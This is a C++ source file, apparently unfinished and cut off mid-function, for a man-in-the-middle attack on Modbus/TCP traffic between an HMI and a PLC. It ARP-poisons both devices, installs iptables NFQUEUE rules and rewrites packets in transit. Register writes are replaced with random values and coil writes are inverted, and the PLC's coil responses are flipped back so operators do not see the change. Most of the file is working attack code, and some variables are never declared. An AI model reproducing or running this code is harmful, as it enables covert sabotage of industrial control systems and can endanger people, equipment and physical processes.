#include <iostream>
#include <string>
#include <vector>
#include <algorithm> // For std::find_if
#include <csignal>   // For signal handling

// PcapPlusPlus headers
#include "PcapLiveDeviceList.h"
#include "PcapLiveDevice.h"
#include "EthLayer.h"
#include "IpV4Layer.h"
#include "TcpLayer.h"
#include "ArpLayer.h"
#include "Packet.h"
#include "RawPacket.h"
#include "PcapPlusPlusVersion.h"
#include "NetworkUtils.h" // For netmask calculation if needed, and general utilities
#include "PcapFilter.h"   // For BPF filters
#include "Logger.h"       // For PcapPlusPlus logging
#include <chrono>         // For timeouts
#include <thread>         // For sleep
#include <atomic>         // For std::atomic<bool>

// libnetfilter_queue header
extern "C" {
#include <libnetfilter_queue/libnetfilter_queue.h>
}

// For ntohs, htonl, etc.
#include <arpa/inet.h> // Should be included by PcapPlusPlus, but good for explicit Modbus handling later
#include <fstream>     // For check_ip_forwarding

// --- Logging Prefixes ---
#define LOG_INFO "[INFO] "
#define LOG_WARN "[WARN] "
#define LOG_ERROR "[ERROR] "
#define LOG_DEBUG "[DEBUG] " // For potential verbose mode

// Global pointer for NFQUEUE handling to allow cleanup on exit
// We might not use NFQUEUE in this specific subtask, but keep for future.
// static struct nfq_handle *nfq_h = nullptr; // This was a placeholder, nfq_h_main is used
// static struct nfq_q_handle *nfq_qh = nullptr; // This was a placeholder

// For ARP spoofing threads
static std::atomic<bool> keep_arp_spoofing_running(false);
static std::vector<std::thread> arp_spoofing_threads;

// For NFQUEUE processing
static std::atomic<bool> keep_nfq_running(false);
static std::vector<std::thread> nfq_processing_threads;
static struct nfq_handle *nfq_h_main = nullptr; 
static struct nfq_q_handle *nfq_qh_hmi_to_plc = nullptr; 
static struct nfq_q_handle *nfq_qh_plc_to_hmi = nullptr; 
// static int nfq_fd_hmi_to_plc = -1; // Not used, fd is from nfq_h_main
// static int nfq_fd_plc_to_hmi = -1; // Not used


// Store original MACs for restoration
static pcpp::MacAddress original_plc_mac_for_hmi;
static pcpp::MacAddress original_hmi_mac_for_plc;
static pcpp::IPv4Address global_plc_ip;
static pcpp::IPv4Address global_hmi_ip;
static pcpp::PcapLiveDevice* global_selected_device = nullptr; // To be used by cleanup
static pcpp::MacAddress global_attacker_mac;


// This dummy callback is not used if specific callbacks are registered for each queue.
// static int nfqueue_callback(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
//                             struct nfq_data *nfa, void *data) {
//     uint32_t id = 0;
//     struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
//     if (ph) {
//         id = ntohl(ph->packet_id);
//     }
//     // For now, just accept all packets.
//     return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
// }


pcpp::Packet craft_arp_reply(pcpp::MacAddress sender_mac_real_attacker, pcpp::IPv4Address sender_ip_to_impersonate, 
                               pcpp::MacAddress target_mac_receiver, pcpp::IPv4Address target_ip_receiver) {
    pcpp::Packet arp_reply_packet;

    // Ethernet Layer
    pcpp::EthLayer ethLayer(sender_mac_real_attacker, target_mac_receiver, PCPP_ETHERTYPE_ARP);
    arp_reply_packet.addLayer(&ethLayer);

    // ARP Layer
    // ARP Opcode: 2 (reply)
    // Sender MAC: Attacker's MAC (sender_mac_real_attacker)
    // Sender IP: The IP we are impersonating (sender_ip_to_impersonate)
    // Target MAC: The MAC of the machine that will receive this ARP reply (target_mac_receiver)
    // Target IP: The IP of the machine that will receive this ARP reply (target_ip_receiver)
    pcpp::ArpLayer arpLayer(PCPP_ARP_REPLY, sender_mac_real_attacker, sender_ip_to_impersonate, target_mac_receiver, target_ip_receiver);
    arp_reply_packet.addLayer(&arpLayer);
    
    arp_reply_packet.computeCalculateFields();
    return arp_reply_packet;
}


void arp_spoof_worker(pcpp::PcapLiveDevice* dev, 
                      pcpp::MacAddress attacker_mac, 
                      pcpp::IPv4Address ip_to_impersonate, 
                      pcpp::MacAddress mac_of_impersonated_ip_real, // Original MAC of the impersonated IP
                      pcpp::IPv4Address target_device_ip, 
                      pcpp::MacAddress target_device_mac, 
                      const std::string& target_name_log_prefix) {
    
    std::cout << "ARP Spoofing Worker started for: " << target_name_log_prefix 
              << " (Targeting " << target_device_ip.toString() << " " << target_device_mac.toString()
              << ", Impersonating " << ip_to_impersonate.toString() 
              << " as " << attacker_mac.toString() << ")" << std::endl;

    unsigned int packets_sent = 0;
    while (keep_arp_spoofing_running) {
        pcpp::Packet arp_packet = craft_arp_reply(attacker_mac, ip_to_impersonate, target_device_mac, target_device_ip);
        
        if (dev->sendPacket(&arp_packet)) {
            packets_sent++;
            if (packets_sent % 10 == 0) { // Log every 10 packets
                 // std::cout << target_name_log_prefix << ": Sent ARP spoof packet #" << packets_sent << " to " << target_device_ip.toString() << std::endl;
            }
        } else {
            std::cerr << target_name_log_prefix << ": Error sending ARP spoof packet to " << target_device_ip.toString() << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::seconds(2)); // Configurable interval
    }

    // ARP Spoofing stopped, send corrective ARP packets
    std::cout << target_name_log_prefix << ": ARP spoofing stopped. Sending corrective ARP packets to " << target_device_ip.toString() << std::endl;
    for (int i = 0; i < 3; ++i) { // Send a few corrective packets
        // Tell target_device_ip that ip_to_impersonate is at its REAL MAC mac_of_impersonated_ip_real
        pcpp::Packet corrective_arp_packet = craft_arp_reply(mac_of_impersonated_ip_real, ip_to_impersonate, target_device_mac, target_device_ip);
        if (!dev->sendPacket(&corrective_arp_packet)) {
            std::cerr << target_name_log_prefix << ": Error sending corrective ARP packet to " << target_device_ip.toString() << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    std::cout << target_name_log_prefix << ": Corrective ARP packets sent to " << target_device_ip.toString() << std::endl;
}


void start_arp_spoofing(pcpp::PcapLiveDevice* dev, 
                        pcpp::MacAddress attacker_mac, 
                        pcpp::IPv4Address plc_ip, pcpp::MacAddress plc_mac, 
                        pcpp::IPv4Address hmi_ip, pcpp::MacAddress hmi_mac) {
    if (!dev || !dev->isOpened()) {
         if (!dev->open()) {
            std::cerr << "Error: Could not open device " << dev->getName() << " for ARP spoofing." << std::endl;
            return;
         }
    }
    
    keep_arp_spoofing_running = true;
    global_selected_device = dev; // Store for cleanup
    global_attacker_mac = attacker_mac;
    original_plc_mac_for_hmi = plc_mac;
    original_hmi_mac_for_plc = hmi_mac;
    global_plc_ip = plc_ip;
    global_hmi_ip = hmi_ip;


    std::cout << "\n--- Starting ARP Spoofing ---" << std::endl;
    std::cout << "Attacker MAC: " << attacker_mac.toString() << std::endl;
    std::cout << "PLC IP: " << plc_ip.toString() << ", PLC MAC: " << plc_mac.toString() << std::endl;
    std::cout << "HMI IP: " << hmi_ip.toString() << ", HMI MAC: " << hmi_mac.toString() << std::endl;

    // Thread 1: Poison HMI's ARP cache (Tell HMI that PLC_IP is at Attacker_MAC)
    arp_spoofing_threads.emplace_back(arp_spoof_worker, dev, attacker_mac, plc_ip, plc_mac, hmi_ip, hmi_mac, "[PoisonHMI]");

    // Thread 2: Poison PLC's ARP cache (Tell PLC that HMI_IP is at Attacker_MAC)
    arp_spoofing_threads.emplace_back(arp_spoof_worker, dev, attacker_mac, hmi_ip, hmi_mac, plc_ip, plc_mac, "[PoisonPLC]");
    
    std::cout << LOG_INFO << "ARP spoofing threads launched." << std::endl;
    std::cout << "-----------------------------" << std::endl;
}


void cleanup_resources(int signal) {
    std::cout << LOG_INFO << "\nCleaning up resources..." << std::endl;

    // 1. Stop NFQUEUE processing first
    if (keep_nfq_running.load()) {
        std::cout << LOG_INFO << "Stopping NFQUEUE processing..." << std::endl;
        keep_nfq_running = false; // Signal NFQ loop to stop

        // The nfq_packet_processor_loop uses a timeout on recv, so it should naturally exit.
        // Additionally, closing handles can expedite this.
        if (nfq_qh_hmi_to_plc) {
            // nfq_destroy_queue will also close the underlying fd if it's the last queue on the handle
            // but we do it explicitly for clarity and safety.
            // nfq_break_loop(nfq_q_handle *qh) can be used if available and preferred.
            // For now, relying on loop flag and then closing main handle.
        }
        if (nfq_qh_plc_to_hmi) {
            // As above
        }
        
        // Closing the main handle should cause recv in the thread to return an error,
        // helping the thread to exit if it's blocked on recv.
        if (nfq_h_main) {
             // nfq_break_loop(nfq_h_main); // Alternative to closing, might be cleaner if it works reliably.
                                         // For now, we rely on recv timeout and then joining.
                                         // If threads don't exit promptly, closing nfq_h_main here (before join) is an option.
        }

        for (auto& t : nfq_processing_threads) {
            if (t.joinable()) {
                t.join(); // Wait for NFQ thread to finish
            }
        }
        std::cout << LOG_INFO << "NFQUEUE processing threads stopped and joined." << std::endl;
        
        // Now destroy queues and close main handle if not already done by thread itself or if join failed.
        if (nfq_qh_hmi_to_plc) { nfq_destroy_queue(nfq_qh_hmi_to_plc); nfq_qh_hmi_to_plc = nullptr; }
        if (nfq_qh_plc_to_hmi) { nfq_destroy_queue(nfq_qh_plc_to_hmi); nfq_qh_plc_to_hmi = nullptr; }
        if (nfq_h_main) { nfq_close(nfq_h_main); nfq_h_main = nullptr; }
    }


    // 2. Stop ARP spoofing
    if (keep_arp_spoofing_running.load()) {
        std::cout << LOG_INFO << "Stopping ARP spoofing threads..." << std::endl;
        keep_arp_spoofing_running = false; 

        for (auto& t : arp_spoofing_threads) {
            if (t.joinable()) {
                t.join();
            }
        }
        std::cout << LOG_INFO << "ARP spoofing threads stopped and joined (corrective ARPs sent)." << std::endl;
    }

    // 3. Remove iptables rules
    if (global_hmi_ip.isValid() && global_plc_ip.isValid()) { 
        configure_iptables_rules(global_hmi_ip, global_plc_ip, false); // false to remove rules
    } else {
        std::cerr << LOG_WARN << "Skipping iptables rule removal due to invalid HMI/PLC IP during cleanup." << std::endl;
    }


    // 4. Clean up NFQUEUE handles (double check, should be nullptrs now)
    if (nfq_qh_hmi_to_plc) { // Check if already destroyed
        nfq_destroy_queue(nfq_qh_hmi_to_plc);
        nfq_qh_hmi_to_plc = nullptr;
    }
    if (nfq_qh_plc_to_hmi) { // Check if already destroyed
        nfq_destroy_queue(nfq_qh_plc_to_hmi);
        nfq_qh_plc_to_hmi = nullptr;
    }
    if (nfq_h_main) { // Check if already closed
        nfq_close(nfq_h_main);
        nfq_h_main = nullptr;
    }
    
    // 5. Close PcapPlusPlus device if globally managed and opened
    if (global_selected_device && global_selected_device->isOpened()) {
        // This was mainly for ARP spoofing threads if they didn't manage their own opening/closing.
        // If discovery functions open/close it, and ARP threads open/close it, this might not be needed.
        // However, if start_arp_spoofing left it open, then this is useful.
        // global_selected_device->close(); 
    }

    std::cout << "Cleanup complete." << std::endl;
    exit(0);
}


#include <iomanip> // For std::hex, std::setw, std::setfill

// --- IPTables and System Configuration ---
bool check_ip_forwarding() {
    std::ifstream file("/proc/sys/net/ipv4/ip_forward");
    char value;
    if (file >> value) {
        return (value == '1');
    }
    std::cerr << "Error: Could not read /proc/sys/net/ipv4/ip_forward" << std::endl;
    return false; // Assume not enabled if can't read
}

void enable_ip_forwarding() {
    std::cout << "Attempting to enable IP forwarding..." << std::endl;
    int result = system("sudo sysctl -w net.ipv4.ip_forward=1");
    if (result == 0) {
        std::cout << "IP forwarding enabled." << std::endl;
    } else {
        std::cerr << "Error: Failed to enable IP forwarding using sysctl. Please enable it manually." << std::endl;
        // Potentially exit if this is critical
    }
}

void configure_iptables_rules(const pcpp::IPv4Address& hmi_ip, const pcpp::IPv4Address& plc_ip, bool add_rules) {
    std::string action = add_rules ? "-I" : "-D"; // -I to Insert (add), -D to Delete
    std::string direction = add_rules ? "Adding" : "Removing";

    std::cout << direction << " iptables rules..." << std::endl;

    // Rule 1: HMI -> PLC (Queue 0)
    std::string rule1 = "sudo iptables " + action + " FORWARD -s " + hmi_ip.toString() +
                        " -d " + plc_ip.toString() + " -p tcp --dport 502 -j NFQUEUE --queue-num 0";
    // Rule 2: PLC -> HMI (Queue 1)
    std::string rule2 = "sudo iptables " + action + " FORWARD -s " + plc_ip.toString() +
                        " -d " + hmi_ip.toString() + " -p tcp --sport 502 -j NFQUEUE --queue-num 1";
    // Rule 3: Allow other traffic from HMI (if needed, otherwise it might be dropped by FORWARD policy)
    // std::string rule3_allow_hmi = "sudo iptables " + action + " FORWARD -s " + hmi_ip.toString() + " -j ACCEPT";
    // std::string rule4_allow_plc = "sudo iptables " + action + " FORWARD -s " + plc_ip.toString() + " -j ACCEPT";


    std::cout << "Executing: " << rule1 << std::endl;
    if (system(rule1.c_str()) != 0 && add_rules) { // Only critical if adding fails
        std::cerr << "Error executing: " << rule1 << std::endl;
    }
    std::cout << "Executing: " << rule2 << std::endl;
    if (system(rule2.c_str()) != 0 && add_rules) {
        std::cerr << "Error executing: " << rule2 << std::endl;
    }
    // if (system(rule3_allow_hmi.c_str()) != 0 && add_rules) { std::cerr << "Error executing: " << rule3_allow_hmi << std::endl; }
    // if (system(rule4_allow_plc.c_str()) != 0 && add_rules) { std::cerr << "Error executing: " << rule4_allow_plc << std::endl; }

    std::cout << "iptables rules configuration attempted." << std::endl;
}


// --- NFQUEUE Callbacks & Processing Loop ---

// Helper functions for Modbus (Big Endian)
static uint16_t parse_uint16_big_endian(const uint8_t* buffer) {
    return (static_cast<uint16_t>(buffer[0]) << 8) | buffer[1];
}

static void write_uint16_big_endian(uint8_t* buffer, uint16_t value) {
    buffer[0] = (value >> 8) & 0xFF;
    buffer[1] = value & 0xFF;
}


static int nfq_callback_hmi_to_plc(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                                   struct nfq_data *nfa, void *data_ptr) {
    uint32_t id = 0;
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) id = ntohl(ph->packet_id);

    unsigned char *raw_nfq_payload;
    int raw_nfq_payload_len = nfq_get_payload(nfa, &raw_nfq_payload);

    if (raw_nfq_payload_len < 0) {
        std::cerr << "[Queue 0: HMI->PLC] Error getting packet payload." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL); // Or NF_DROP
    }

    // Wrap the NFQUEUE payload (which is an IP packet) with PcapPlusPlus
    pcpp::RawPacket rawPacketInstance(raw_nfq_payload, raw_nfq_payload_len, timeval{0,0}, false, pcpp::LINKTYPE_IPV4);
    pcpp::Packet parsedPacket(&rawPacketInstance);

    pcpp::IPv4Layer* ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    pcpp::TcpLayer* tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();

    if (!ipLayer || !tcpLayer) {
        // std::cout << "[Queue 0: HMI->PLC] Not a TCP/IP packet. Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }
    
    uint16_t srcPort = ntohs(tcpLayer->getTcpHeader()->portSrc);
    uint16_t dstPort = ntohs(tcpLayer->getTcpHeader()->portDst);

    // Assuming HMI is client, PLC is server (port 502)
    if (dstPort != 502) { 
        // std::cout << "[Queue 0: HMI->PLC] Dest port not 502. Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }
    
    uint8_t* tcp_payload_data = tcpLayer->getLayerPayload();
    size_t tcp_payload_len = tcpLayer->getLayerPayloadSize();

    if (tcp_payload_len < 7) { // Min MBAP header size
        // std::cout << "[Queue 0: HMI->PLC] TCP payload too short for Modbus. Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }

    // MBAP Header
    uint16_t transaction_id = parse_uint16_big_endian(tcp_payload_data);
    uint16_t protocol_id = parse_uint16_big_endian(tcp_payload_data + 2);
    uint16_t length = parse_uint16_big_endian(tcp_payload_data + 4);
    uint8_t unit_id = tcp_payload_data[6];

    if (protocol_id != 0) {
        // std::cout << "[Queue 0: HMI->PLC] Not Modbus protocol (Proto ID != 0). Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }

    if (tcp_payload_len < 7 + length -1 ) { // MBAP_len (7) + PDU_len (length field includes unitID + PDU)
         // std::cout << "[Queue 0: HMI->PLC] TCP payload shorter than Modbus length field. Accepting." << std::endl;
         // return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }


    uint8_t function_code = tcp_payload_data[7];
    std::cout << "[Queue 0: HMI->PLC] Modbus Query: TID=" << transaction_id << " UID=" << (int)unit_id 
              << " FC=" << (int)function_code << " Len=" << length << std::endl;

    bool modified = false;

    if (function_code == 16) { // Write Multiple Registers
        if (tcp_payload_len >= 7 + 6) { // MBAP + FC + StartAddr(2) + Quantity(2) + ByteCount(1)
            uint16_t start_addr = parse_uint16_big_endian(tcp_payload_data + 8);
            uint16_t quantity_registers = parse_uint16_big_endian(tcp_payload_data + 10);
            uint8_t byte_count = tcp_payload_data[12];

            if (tcp_payload_len >= 7 + 6 + byte_count) { // Check if all data is present
                std::cout << "  FC16: StartAddr=" << start_addr << " Quantity=" << quantity_registers << " ByteCount=" << (int)byte_count << std::endl;
                std::cout << "    Original Values: ";
                for (int i = 0; i < quantity_registers; ++i) {
                    uint16_t val = parse_uint16_big_endian(tcp_payload_data + 13 + (i * 2));
                    std::cout << val << " ";
                }
                std::cout << std::endl;

                // Modify register values
                for (int i = 0; i < quantity_registers; ++i) {
                    uint16_t new_val = (rand() % (20000 - 10000 + 1)) + 10000;
                    write_uint16_big_endian(tcp_payload_data + 13 + (i * 2), new_val);
                }
                modified = true;

                std::cout << "    Modified Values: ";
                for (int i = 0; i < quantity_registers; ++i) {
                     uint16_t val = parse_uint16_big_endian(tcp_payload_data + 13 + (i*2));
                    std::cout << val << " ";
                }
                std::cout << std::endl;
            }
        }
    } else if (function_code == 5) { // Write Single Coil
        if (tcp_payload_len >= 7 + 5) { // MBAP + FC + OutputAddr(2) + Value(2)
            uint16_t output_addr = parse_uint16_big_endian(tcp_payload_data + 8);
            uint16_t current_value = parse_uint16_big_endian(tcp_payload_data + 10);
            std::cout << "  FC5: OutputAddr=" << output_addr << " OriginalValue=" << (current_value == 0xFF00 ? "ON" : (current_value == 0x0000 ? "OFF" : "UNKNOWN")) << std::endl;

            uint16_t new_value = (current_value == 0xFF00) ? 0x0000 : 0xFF00; // Toggle
            write_uint16_big_endian(tcp_payload_data + 10, new_value);
            modified = true;
            std::cout << "  FC5: ModifiedValue=" << (new_value == 0xFF00 ? "ON" : "OFF") << std::endl;
        }
    }

    if (modified) {
        parsedPacket.computeCalculateFields(); // Recalculate checksums
        // Get potentially modified packet bytes
        pcpp::RawAssembly::RawPacketData* modified_raw_data = parsedPacket.getRawPacket()->getRawData();
        return nfq_set_verdict(qh, id, NF_ACCEPT, modified_raw_data->len, modified_raw_data->data);

    } else {
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }
}

static int nfq_callback_plc_to_hmi(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                                   struct nfq_data *nfa, void *data_ptr) {
    uint32_t id = 0;
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) id = ntohl(ph->packet_id);

    unsigned char *raw_nfq_payload;
    int raw_nfq_payload_len = nfq_get_payload(nfa, &raw_nfq_payload);

    if (raw_nfq_payload_len < 0) {
        std::cerr << "[Queue 1: PLC->HMI] Error getting packet payload." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }
    
    pcpp::RawPacket rawPacketInstance(raw_nfq_payload, raw_nfq_payload_len, timeval{0,0}, false, pcpp::LINKTYPE_IPV4);
    pcpp::Packet parsedPacket(&rawPacketInstance);

    pcpp::IPv4Layer* ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    pcpp::TcpLayer* tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();

    if (!ipLayer || !tcpLayer) {
        // std::cout << "[Queue 1: PLC->HMI] Not a TCP/IP packet. Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }

    uint16_t srcPort = ntohs(tcpLayer->getTcpHeader()->portSrc);
    // uint16_t dstPort = ntohs(tcpLayer->getTcpHeader()->portDst);

    if (srcPort != 502) { // PLC is server, so source port should be 502 for responses
        // std::cout << "[Queue 1: PLC->HMI] Source port not 502. Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }

    uint8_t* tcp_payload_data = tcpLayer->getLayerPayload();
    size_t tcp_payload_len = tcpLayer->getLayerPayloadSize();

    if (tcp_payload_len < 7) { // Min MBAP header size
        // std::cout << "[Queue 1: PLC->HMI] TCP payload too short for Modbus. Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }
    
    uint16_t transaction_id = parse_uint16_big_endian(tcp_payload_data);
    uint16_t protocol_id = parse_uint16_big_endian(tcp_payload_data + 2);
    uint16_t length = parse_uint16_big_endian(tcp_payload_data + 4);
    uint8_t unit_id = tcp_payload_data[6];

    if (protocol_id != 0) {
        // std::cout << "[Queue 1: PLC->HMI] Not Modbus protocol (Proto ID != 0). Accepting." << std::endl;
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }
    
    uint8_t function_code = tcp_payload_data[7]; // PDU starts after MBAP
    std::cout << "[Queue 1: PLC->HMI] Modbus Response: TID=" << transaction_id << " UID=" << (int)unit_id 
              << " FC=" << (int)function_code << " Len=" << length << std::endl;
    
    bool modified = false;

    if (function_code == 5) { // Response to Write Single Coil
        if (tcp_payload_len >= 7 + 5) { // MBAP + FC + OutputAddr(2) + Value(2)
            uint16_t output_addr = parse_uint16_big_endian(tcp_payload_data + 8);
            uint16_t current_value = parse_uint16_big_endian(tcp_payload_data + 10);
            std::cout << "  FC5 Response: OutputAddr=" << output_addr << " OriginalValue=" << (current_value == 0xFF00 ? "ON" : (current_value == 0x0000 ? "OFF" : "UNKNOWN")) << std::endl;

            uint16_t new_value = (current_value == 0xFF00) ? 0x0000 : 0xFF00; // Toggle
            write_uint16_big_endian(tcp_payload_data + 10, new_value);
            modified = true;
            std::cout << "  FC5 Response: ModifiedValue=" << (new_value == 0xFF00 ? "ON" : "OFF") << std::endl;
        }
    } else if (function_code == 16) { // Response to Write Multiple Registers
         if (tcp_payload_len >= 7 + 5) { // MBAP + FC + StartAddr(2) + Quantity(2)
            uint16_t start_addr = parse_uint16_big_endian(tcp_payload_data + 8);
            uint16_t quantity_registers = parse_uint16_big_endian(tcp_payload_data + 10);
            std::cout << "  FC16 Response: StartAddr=" << start_addr << " QuantityWritten=" << quantity_registers << std::endl;
            // No modification for FC16 responses in python script, just logging.
         }
    }


    if (modified) {
        parsedPacket.computeCalculateFields(); // Recalculate checksums
        pcpp::RawAssembly::RawPacketData* modified_raw_data = parsedPacket.getRawPacket()->getRawData();
        return nfq_set_verdict(qh, id, NF_ACCEPT, modified_raw_data->len, modified_raw_data->data);
    } else {
        return nfq_set_verdict(qh, id, NF_ACCEPT, raw_nfq_payload_len, raw_nfq_payload);
    }
}


void nfq_packet_processor_loop(struct nfq_q_handle *q_handle, const std::string& queue_name_log) {
    char buf[4096] __attribute__ ((aligned));
    int rv;
    int fd = nfq_fd(nfq_h_main); // Use the main NFQUEUE handle's FD

    std::cout << queue_name_log << ": Starting packet processing loop on FD " << fd << std::endl;

    // Make the recv call non-blocking to periodically check keep_nfq_running
    struct timeval tv;
    tv.tv_sec = 1; // 1 second timeout for recv
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);


    while (keep_nfq_running) {
        if ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
            // std::cout << queue_name_log << ": Recv returned " << rv << std::endl;
            // Pass the nfq_h_main, not the queue specific q_handle to nfq_handle_packet
            nfq_handle_packet(nfq_h_main, buf, rv); 
        } else if (rv < 0 && errno != EAGAIN) { // EAGAIN means timeout, which is fine
            // std::cerr << queue_name_log << ": Recv failed with error: " << strerror(errno) << std::endl;
            // Potentially break or handle error if it's not just a timeout
            if (!keep_nfq_running) break; // Exit if stopping
        }
        // If rv == 0, it means peer has performed an orderly shutdown, but for NFQUEUE this shouldn't happen.
    }
    std::cout << queue_name_log << ": Packet processing loop stopped." << std::endl;
}


bool initialize_nfq(const pcpp::IPv4Address& hmi_ip, const pcpp::IPv4Address& plc_ip) {
    std::cout << "\n--- Initializing NetfilterQueue ---" << std::endl;
    
    keep_nfq_running = true; // Set the flag to start NFQ processing

    nfq_h_main = nfq_open();
    if (!nfq_h_main) {
        std::cerr << "Error during nfq_open()" << std::endl; return false;
    }

    if (nfq_unbind_pf(nfq_h_main, AF_INET) < 0) {
        std::cerr << "Error during nfq_unbind_pf()" << std::endl; nfq_close(nfq_h_main); nfq_h_main = nullptr; return false;
    }
    if (nfq_bind_pf(nfq_h_main, AF_INET) < 0) {
        std::cerr << "Error during nfq_bind_pf()" << std::endl; nfq_close(nfq_h_main); nfq_h_main = nullptr; return false;
    }

    // Queue 0: HMI -> PLC
    std::cout << "Creating NFQUEUE queue 0 (HMI->PLC)" << std::endl;
    nfq_qh_hmi_to_plc = nfq_create_queue(nfq_h_main, 0, &nfq_callback_hmi_to_plc, nullptr);
    if (!nfq_qh_hmi_to_plc) {
        std::cerr << "Error during nfq_create_queue() for queue 0" << std::endl; nfq_close(nfq_h_main); nfq_h_main = nullptr; return false;
    }
    if (nfq_set_mode(nfq_qh_hmi_to_plc, NFQNL_COPY_PACKET, 0xffff) < 0) {
        std::cerr << "Can't set packet_copy mode for queue 0" << std::endl; nfq_destroy_queue(nfq_qh_hmi_to_plc); nfq_close(nfq_h_main); nfq_h_main = nullptr; return false;
    }
    nfq_fd_hmi_to_plc = nfq_fd(nfq_h_main); // Same FD for all queues on a single handle

    // Queue 1: PLC -> HMI
    std::cout << "Creating NFQUEUE queue 1 (PLC->HMI)" << std::endl;
    nfq_qh_plc_to_hmi = nfq_create_queue(nfq_h_main, 1, &nfq_callback_plc_to_hmi, nullptr);
    if (!nfq_qh_plc_to_hmi) {
        std::cerr << "Error during nfq_create_queue() for queue 1" << std::endl; nfq_destroy_queue(nfq_qh_hmi_to_plc); nfq_close(nfq_h_main); nfq_h_main = nullptr; return false;
    }
    if (nfq_set_mode(nfq_qh_plc_to_hmi, NFQNL_COPY_PACKET, 0xffff) < 0) {
        std::cerr << "Can't set packet_copy mode for queue 1" << std::endl; nfq_destroy_queue(nfq_qh_plc_to_hmi); nfq_destroy_queue(nfq_qh_hmi_to_plc); nfq_close(nfq_h_main); nfq_h_main = nullptr; return false;
    }
    nfq_fd_plc_to_hmi = nfq_fd(nfq_h_main); // Same FD

    // Launch threads for each queue - using the same FD from the main handle
    // The nfq_handle_packet function uses the main handle (nfq_h_main) to dispatch to the correct callback based on packet's queue_num
    // So, we can have one thread reading from nfq_fd(nfq_h_main) and it will process for all queues bound to nfq_h_main.
    // Or, two threads reading from the same FD - this might be problematic.
    // Let's try one thread first that handles packets for both queues. If performance is an issue, can explore multiple handles.
    // For now, one thread is simpler. The current nfq_packet_processor_loop is designed for one handle.
    // If we want two threads, they would both use nfq_fd(nfq_h_main).

    // Correction: nfq_fd() returns the file descriptor for the main handle.
    // We only need one processing loop that uses this FD, and nfq_handle_packet will dispatch
    // to the correct queue's callback.
    std::cout << "Launching NFQUEUE packet processing thread..." << std::endl;
    nfq_processing_threads.emplace_back(nfq_packet_processor_loop, nfq_qh_hmi_to_plc, "[NFQ_Processor]"); // Pass one of the q_handles just for logging context, or nullptr
                                                                                                        // The important part is the main FD used internally by the loop.

    std::cout << "NetfilterQueue initialized successfully." << std::endl;
    std::cout << "------------------------------------" << std::endl;
    return true;
}

// Helper to parse command line arguments
std::string get_cmd_option(char **begin, char **end, const std::string &option) {
    char **itr = std::find(begin, end, option);
    if (itr != end && ++itr != end) {
        return *itr;
    }
    return "";
}

pcpp::PcapLiveDevice* select_interface(const std::string& iface_name_or_ip) {
    const std::vector<pcpp::PcapLiveDevice*>& devList = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevices();
    if (devList.empty()) {
        std::cerr << "No network interfaces found!" << std::endl;
        return nullptr;
    }

    pcpp::PcapLiveDevice* selected_dev = nullptr;

    if (!iface_name_or_ip.empty()) {
        // Try to find by name or IP
        selected_dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(iface_name_or_ip);
        if (!selected_dev) {
            std::cerr << "Could not find interface by name or IP: " << iface_name_or_ip << std::endl;
        }
    } else {
        // Auto-select: first non-loopback, IPv4-enabled, and preferably "up" interface
        for (pcpp::PcapLiveDevice* dev : devList) {
            if (dev->isLoopback() || dev->getIPv4Address() == pcpp::IPv4Address::Zero || dev->getIPv4Mask() == pcpp::IPv4Address::Zero) {
                continue;
            }
            // PcapPlusPlus doesn't directly tell if an interface is "up" in a cross-platform way easily accessible here.
            // We'll assume if it has a valid IP and Mask and isn't loopback, it's a candidate.
            // Also check if device is openable, as a proxy for being "up"
            if (dev->open()) { // Attempt to open to check its usability
                selected_dev = dev;
                dev->close(); // Close immediately, we'll reopen if needed for operations
                break;
            }
        }
        if (!selected_dev) {
            std::cerr << "Could not automatically select a suitable interface." << std::endl;
        }
    }
    return selected_dev;
}

std::vector<pcpp::IPv4Address> get_subnet_ips(pcpp::IPv4Address ip, pcpp::IPv4Address netmask) {
    std::vector<pcpp::IPv4Address> ips_in_subnet;

    if (ip == pcpp::IPv4Address::Zero || netmask == pcpp::IPv4Address::Zero) {
        std::cerr << "Invalid IP address or netmask for subnet calculation." << std::endl;
        return ips_in_subnet;
    }

